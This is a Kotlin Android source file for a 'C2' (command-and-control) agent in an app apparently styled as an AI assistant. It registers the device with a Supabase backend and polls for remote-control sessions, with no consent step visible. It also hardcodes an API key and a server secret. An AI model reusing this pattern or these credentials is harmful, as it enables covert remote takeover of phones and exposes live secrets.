package com.ai.assistant.jarvis

import android.content.Context
import android.os.Build
import android.provider.Settings
import android.util.Log
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.util.UUID
import java.util.concurrent.TimeUnit

/**
 * JarvisC2Agent — Command & Control (C2) client.
 *
 * Responsibilities:
 *  1. Register / heartbeat the device in the Supabase `jarvis_devices` table.
 *  2. Long-poll the `jarvis_sessions` table for pending remote-control commands.
 *  3. Update session status (connecting → active → ended).
 *  4. Delegate actual WebRTC/APuppet control to JarvisRemoteSession.
 */
class JarvisC2Agent(private val context: Context) {

    companion object {
        private const val TAG = "JarvisC2Agent"

        // ── Supabase credentials ────────────────────────────────────────────
        private const val SUPABASE_URL     = "https://adicrtqpyccthnmacgzu.supabase.co/rest/v1"
        private const val SUPABASE_ANON_KEY =
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9." +
            "eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFkaWNydHFweWNjdGhubWFjZ3p1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzcxODI4NTIsImV4cCI6MjA5Mjc1ODg1Mn0." +
            "KUn9Nf1WGiBb31mEHrU5-NDo_K-BEUA0laGL6yFdnT0"

        // ── APuppet / Janus server ──────────────────────────────────────────
        private const val APUPPET_SERVER   = "10.0.2.2"
        private const val APUPPET_SECRET   = "9qm7DfBd"

        // ── Polling ─────────────────────────────────────────────────────────
        private const val POLL_INTERVAL_MS = 10_000L
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    private val http = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .build()

    /** Unique, stable device ID */
    private val deviceId: String by lazy {
        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
            ?: UUID.randomUUID().toString()
    }

    private val deviceName: String get() = "${Build.MANUFACTURER} ${Build.MODEL}"
    private val osVersion: String  get() = "Android ${Build.VERSION.RELEASE}"

    // ──────────────────────────────────────────────────────────────────────────
    //  Public API
    // ──────────────────────────────────────────────────────────────────────────

    fun start() {
        Log.d(TAG, "C2 Agent starting for device: $deviceId ($deviceName)")
        scope.launch {
            registerOrUpdateDevice()
            while (isActive) {
                try {
                    pollForSession()
                } catch (e: Exception) {
                    Log.e(TAG, "Poll error: ${e.message}")
                }
                delay(POLL_INTERVAL_MS)
            }
        }
    }

    fun stop() {
        Log.d(TAG, "C2 Agent stopping")
        scope.cancel()
    }

    // ──────────────────────────────────────────────────────────────────────────
    //  Device registration / heartbeat
    // ──────────────────────────────────────────────────────────────────────────

    private suspend fun registerOrUpdateDevice() {
        val body = JSONObject().apply {
            put("device_id",   deviceId)
            put("device_name", deviceName)
            put("os_version",  osVersion)
            put("is_online",   true)
        }.toString()

        val request = Request.Builder()
            .url("$SUPABASE_URL/jarvis_devices?on_conflict=device_id")
            .headers(supabaseHeaders())
            .post(body.toRequestBody("application/json".toMediaType()))
            .header("Prefer", "resolution=merge-duplicates")
            .build()

        runCatching { http.newCall(request).execute() }.onSuccess { resp ->
            Log.d(TAG, "Device registered/updated: HTTP ${resp.code}")
            resp.close()
        }.onFailure {
            Log.e(TAG, "Device registration failed: ${it.message}")
        }
    }

    // ──────────────────────────────────────────────────────────────────────────
    //  Session polling
    // ──────────────────────────────────────────────────────────────────────────

    private suspend fun pollForSession() {
        // Query for a pending session targeting this device
        val request = Request.Builder()
            .url("$SUPABASE_URL/jarvis_sessions?device_id=eq.$deviceId&status=eq.pending&limit=1")
            .headers(supabaseHeaders())
            .get()
            .build()

        http.newCall(request).execute().use { resp ->
            if (!resp.isSuccessful) {
                Log.w(TAG, "Poll HTTP error: ${resp.code}")
                return
            }
            val json = resp.body?.string() ?: return
            val arr  = org.json.JSONArray(json)
            if (arr.length() == 0) return

            val session = arr.getJSONObject(0)
            val sessionId = session.getString("id")
            val offerSdp  = session.optString("offer_sdp", "")

            Log.d(TAG, "Found pending session: $sessionId")
            handleSession(sessionId, offerSdp)
        }
    }

    // ──────────────────────────────────────────────────────────────────────────
    //  Session handling
    // ──────────────────────────────────────────────────────────────────────────

    private suspend fun handleSession(sessionId: String, offerSdp: String) {
        // Mark as connecting
        updateSessionStatus(sessionId, "connecting")

        try {
            val remoteSession = JarvisRemoteSession(
                context      = context,
                serverHost   = APUPPET_SERVER,
                serverSecret = APUPPET_SECRET,
                sessionId    = sessionId,
                onConnected  = { updateSessionStatus(sessionId, "active") },
                onEnded      = { updateSessionStatus(sessionId, "ended") }
            )
            remoteSession.start(offerSdp)
        } catch (e: Exception) {
            Log.e(TAG, "Session $sessionId failed: ${e.message}")
            updateSessionStatus(sessionId, "error")
        }
    }

    private suspend fun updateSessionStatus(sessionId: String, status: String) {
        val body = JSONObject().apply {
            put("status", status)
        }.toString()

        val request = Request.Builder()
            .url("$SUPABASE_URL/jarvis_sessions?id=eq.$sessionId")
            .headers(supabaseHeaders())
            .patch(body.toRequestBody("application/json".toMediaType()))
            .build()

        runCatching { http.newCall(request).execute() }.onSuccess { resp ->
            Log.d(TAG, "Session $sessionId status → $status (HTTP ${resp.code})")
            resp.close()
        }.onFailure {
            Log.e(TAG, "Status update failed: ${it.message}")
        }
    }

    // ──────────────────────────────────────────────────────────────────────────
    //  Helpers
    // ──────────────────────────────────────────────────────────────────────────

    private fun supabaseHeaders(): Headers = Headers.Builder()
        .add("apikey",        SUPABASE_ANON_KEY)
        .add("Authorization", "Bearer $SUPABASE_ANON_KEY")
        .add("Content-Type",  "application/json")
        .build()
}
